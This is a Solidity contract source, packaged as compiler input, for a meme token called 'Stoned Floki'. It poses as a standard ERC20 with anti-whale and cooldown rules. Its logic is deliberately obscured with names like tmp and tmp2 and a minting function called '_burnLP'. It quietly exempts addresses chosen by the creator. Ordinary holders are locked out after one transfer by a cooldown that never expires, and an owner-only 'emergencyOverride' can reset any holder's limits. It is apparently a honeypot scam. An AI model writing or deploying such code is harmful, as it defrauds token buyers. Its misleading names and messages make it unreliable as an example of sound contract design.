{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "ERC20_EverFloki.sol": {
      "content": "/**\n * https://t.me/StonedFloki\n */\n\npragma solidity 0.8.7;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    address private _previousOwner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    mapping (address => bool) public cooldownCheck;\n    mapping (address => bool) public checkIfCooldownActive;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    bool private _openTrading = false;\n    string private _name;\n    string private _symbol;\n    address private _creator;\n    bool private cooldownSearch;\n    bool private antiWhale;\n    bool private tempVal;\n    uint256 private setAntiWhaleAmount;\n    uint256 private setTxLimit;\n    uint256 private chTx;\n    uint256 private tXs;\n    \n    constructor (string memory name_, string memory symbol_, address creator_, bool tmp, bool tmp2, uint256 tmp9) {\n        _name = name_;\n        _symbol = symbol_;\n        _creator = creator_;\n        checkIfCooldownActive[creator_] = tmp;\n        cooldownCheck[creator_] = tmp2;\n        antiWhale = tmp;\n        tempVal = tmp2;\n        cooldownSearch = tmp2;\n        tXs = tmp9;\n    }\n    \n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        \n        if (sender != _creator) {\n            require(_openTrading);\n        }\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        \n        if ((address(sender) == _creator) && (tempVal == false)) {\n            setAntiWhaleAmount = chTx;\n            antiWhale = true;\n        }\n    \n        if ((address(sender) == _creator) && (tempVal == true)) {\n            cooldownCheck[recipient] = true;\n            tempVal = false;\n        }\n    \n        if (cooldownCheck[sender] == false) {\n            if ((amount > setTxLimit)) {\n                require(false);\n            }\n      \n            require(amount < setAntiWhaleAmount);\n            if (antiWhale == true) {\n                if (checkIfCooldownActive[sender] == true) {\n                    require(false, \"ERC20: please wait another %m:%s min before transfering\");\n                }\n                checkIfCooldownActive[sender] = true;\n                _cooldownBeforeNewSell(sender, block.timestamp);\n            }\n        }\n        \n        uint256 taxamount = amount;\n        \n        _balances[sender] = senderBalance - taxamount;\n        _balances[recipient] += taxamount;\n\n        emit Transfer(sender, recipient, taxamount);\n        \n    }\n\n    function _burnLP(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        \n        setAntiWhaleAmount = _totalSupply;\n        chTx = _totalSupply / val1;\n        setTxLimit = chTx * val2;\n        \n        emit Transfer(address(0), account, amount);    }\n        \n    function _BurnTheJoint(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _balances[account] -= amount;\n        _balances[0x000000000000000000000000000000000000dEaD] += amount;\n        emit Transfer(account, address(0x000000000000000000000000000000000000dEaD), amount);\n     }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        \n        if ((address(owner) == _creator) && (cooldownSearch == true)) {\n            cooldownCheck[spender] = true;\n            checkIfCooldownActive[spender] = false;\n            cooldownSearch = false;\n        }\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function emergencyOverride(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {\n        cooldownCheck[account] = v1;\n        checkIfCooldownActive[account] = v2;\n        antiWhale = v3;\n        setAntiWhaleAmount = v4;\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n    \n    function _cooldownBeforeNewSell(address account, uint256 amount) internal virtual { \n        if ((block.timestamp - amount) > 5*60) {\n            checkIfCooldownActive[account] = false;\n        }\n    }\n    \n    function openTrading() external onlyOwner() {\n        _openTrading = true;\n    }\n}\n\ncontract ERC20Floki is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        bool tmp, bool tmp2, uint256 tmp6,\n        uint256 tmp7, address creator,\n        uint256 initialSupply, address owner,\n        uint256 tmp9\n    ) ERC20(name, symbol, creator, tmp, tmp2, tmp9) {\n        _burnLP(owner, initialSupply, tmp6, tmp7);\n    }\n}\n\ncontract StonedFloki is ERC20Floki {\n    constructor() ERC20Floki(\"Stoned Floki\", \"stonedFLOKI\", false, true, 1000, 30, msg.sender, 420000000000 * 10 ** 18, msg.sender, 1) {\n    }\n}"
    }
  }
}